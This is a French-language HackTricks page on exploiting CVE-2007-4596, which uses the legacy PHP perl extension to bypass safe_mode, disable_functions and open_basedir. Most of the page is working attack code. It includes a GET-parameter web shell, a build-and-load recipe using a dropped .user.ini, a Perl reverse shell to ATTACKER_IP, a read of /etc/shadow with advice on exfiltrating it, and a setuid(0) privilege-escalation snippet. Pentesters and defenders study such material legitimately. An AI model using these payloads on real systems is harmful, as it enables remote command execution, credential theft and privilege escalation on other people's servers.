# Exploit de contournement Safe_mode de l'extension Perl pour PHP

{{#include ../../../../banners/hacktricks-training.md}}

## Contexte

Le problème répertorié sous **CVE-2007-4596** provient de l'extension `perl` pour PHP obsolète, qui intègre un interpréteur Perl complet sans respecter les contrôles `safe_mode`, `disable_functions` ou `open_basedir` de PHP. Tout worker PHP chargeant `extension=perl.so` obtient un `eval` Perl sans restriction, donc l'exécution de commandes reste triviale même lorsque toutes les primitives classiques de création de processus PHP sont bloquées. Bien que `safe_mode` ait disparu dans PHP 5.4, de nombreuses stacks d'hébergement mutualisé obsolètes et des labs vulnérables l'incluent encore, donc ce contournement reste utile lorsque vous tombez sur des panneaux de contrôle legacy.

## Compatibilité & statut de packaging (2025)

* La dernière version PECL (`perl-1.0.1`, 2013) cible PHP ≥5.0 ; PHP 8+ échoue généralement car les API Zend ont changé.
* PECL est en train d'être supplanté par PIE, mais les anciennes stacks distribuent encore PECL/pear. Utilisez le flux ci‑dessous sur des cibles PHP 5/7 ; sur des PHP plus récents, prévoyez de rétrograder ou de passer à un autre vecteur d'injection (p.ex., userland FFI).

## Construire un environnement testable en 2025

* Récupérez `perl-1.0.1` depuis PECL, compilez-le pour la branche PHP que vous comptez attaquer, et chargez-le globalement (`php.ini`) ou via `dl()` (si autorisé).
* Recette rapide pour un lab basé sur Debian :
```bash
sudo apt install php5.6 php5.6-dev php-pear build-essential
sudo pecl install perl-1.0.1
echo "extension=perl.so" | sudo tee /etc/php/5.6/mods-available/perl.ini
sudo phpenmod perl && sudo systemctl restart apache2
```
* Pendant l'exploitation, confirmez la disponibilité avec `var_dump(extension_loaded('perl'));` ou `print_r(get_loaded_extensions());`. Si absent, cherchez `perl.so` ou abusez des entrées `php.ini`/`.user.ini` inscriptibles pour forcer son chargement.
* Comme l'interpréteur réside à l'intérieur du worker PHP, aucun binaire externe n'est nécessaire — les filtres de sortie réseau ou les listes noires `proc_open` n'ont pas d'importance.

### Chaîne de compilation sur l'hôte lorsque phpize est accessible

Si `phpize` et build-essential sont présents sur l'hôte compromis, vous pouvez compiler et déposer `perl.so` sans exécuter de commandes externes au système d'exploitation :
```bash
# grab the tarball from PECL
wget https://pecl.php.net/get/perl-1.0.1.tgz
tar xvf perl-1.0.1.tgz && cd perl-1.0.1
phpize
./configure --with-perl=/usr/bin/perl --with-php-config=$(php -r 'echo PHP_BINARY;')-config
make -j$(nproc)
cp modules/perl.so /tmp/perl.so
# then load with a .user.ini in the webroot if main php.ini is read-only
echo "extension=/tmp/perl.so" > /var/www/html/.user.ini
```
Si `open_basedir` est appliqué, assurez-vous que les fichiers `.user.ini` et `.so` déposés résident dans un chemin autorisé ; la directive `extension=` est toujours respectée à l'intérieur du basedir. Le flux de compilation suit le manuel PHP pour la construction des extensions PECL.

## Original PoC (NetJackal)

From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/), still handy to confirm the extension responds to `eval`:
```php
<?php
if(!extension_loaded('perl'))die('perl extension is not loaded');
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls';
$perl=new perl();
echo "<textarea rows='25' cols='75'>";
$perl->eval("system('".$_GET['cmd']."')");
echo "&lt;/textarea&gt;";
$_GET['cmd']=htmlspecialchars($_GET['cmd']);
echo "<br><form>CMD: <input type=text name=cmd value='".$_GET['cmd']."' size=25></form>";
?>
```
## Améliorations modernes des payloads

### 1. TTY complet sur TCP

L'interpréteur embarqué peut charger `IO::Socket` même si `/usr/bin/perl` est bloqué:
```php
$perl = new perl();
$payload = <<<'PL'
use IO::Socket::INET;
my $c = IO::Socket::INET->new(PeerHost=>'ATTACKER_IP',PeerPort=>4444,Proto=>'tcp');
open STDIN,  '<&', $c;
open STDOUT, '>&', $c;
open STDERR, '>&', $c;
exec('/bin/sh -i');
PL;
$perl->eval($payload);
```
### 2. File-System Escape Même avec `open_basedir`

Perl ignore le `open_basedir` de PHP, donc vous pouvez lire des fichiers arbitraires :
```php
$perl = new perl();
$perl->eval('open(F,"/etc/shadow") || die $!; print while <F>; close F;');
```
Redirigez la sortie via `IO::Socket::INET` ou `Net::HTTP` pour exfiltrer des données sans toucher aux descripteurs gérés par PHP.

### 3. Inline Compilation for Privilege Escalation

Si `Inline::C` est disponible au niveau système, compilez des helpers dans la requête sans recourir aux modules `ffi` ou `pcntl` de PHP :
```php
$perl = new perl();
$perl->eval(<<<'PL'
use Inline C => 'DATA';
print escalate();
__DATA__
__C__
char* escalate(){ setuid(0); system("/bin/bash -c 'id; cat /root/flag'"); return ""; }
PL
);
```
### 4. Énumération Living-off-the-Land

Traitez Perl comme une trousse d'outils LOLBAS — par exemple, dump les DSN MySQL même si `mysqli` est manquant:
```php
$perl = new perl();
$perl->eval('use DBI; @dbs = DBI->data_sources("mysql"); print join("\n", @dbs);');
```
## Références

- [Résumé et chronologie de CVE-2007-4596](https://www.cvedetails.com/cve/CVE-2007-4596/)
- [Informations sur le package de l'extension perl PECL](https://pecl.php.net/package/perl)
- [Manuel PHP : compilation des extensions PECL avec phpize](https://www.php.net/manual/en/install.pecl.phpize.php)
- [Page d'accueil PECL annonçant le remplacement de PIE](https://pecl.php.net/)

{{#include ../../../../banners/hacktricks-training.md}}
